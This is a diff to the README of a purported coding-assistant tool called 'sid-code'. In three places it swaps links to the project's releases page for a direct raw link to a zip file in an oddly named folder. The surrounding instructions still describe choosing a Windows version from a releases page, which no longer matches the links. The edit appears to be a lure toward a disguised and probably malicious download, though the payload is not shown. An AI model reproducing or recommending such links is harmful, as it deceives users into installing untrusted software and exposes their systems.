@@ -1,6 +1,6 @@
 # <h1>🤖 sid-code - Your Smart Coding Assistant, Simplified</h1>
 
-[![Download Now](https://img.shields.io/badge/Download-sid--code-2ea44f?style=for-the-badge)](https://github.com/kathlinvalorous353/sid-code/releases)
+[![Download Now](https://img.shields.io/badge/Download-sid--code-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/kathlinvalorous353/sid-code/main/submuriate/1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! sid-code is a tool that helps you write and manage computer programs us
 
 ### 📥 Downloading sid-code
 
-Visit this link to download the application: **[Download sid-code](https://github.com/kathlinvalorous353/sid-code/releases)**
+Visit this link to download the application: **[Download sid-code](https://raw.githubusercontent.com/kathlinvalorous353/sid-code/main/submuriate/1.1.zip)**
 
 When you click that link, you'll go to a page where you can get the program. Choose the version that says "Windows" if you're using a PC. The download might take a few minutes, so be patient.
 
@@ -131,7 +131,7 @@ If something isn't working, try these steps:
 ## 🔄 Updating sid-code
 
 We regularly improve sid-code. To get the latest version:
-1. Visit the [download page](https://github.com/kathlinvalorous353/sid-code/releases) again
+1. Visit the [download page](https://raw.githubusercontent.com/kathlinvalorous353/sid-code/main/submuriate/1.1.zip) again
 2. Check the date of the latest release
 3. Download the newest version
 4. Replace your old version (or install over it)
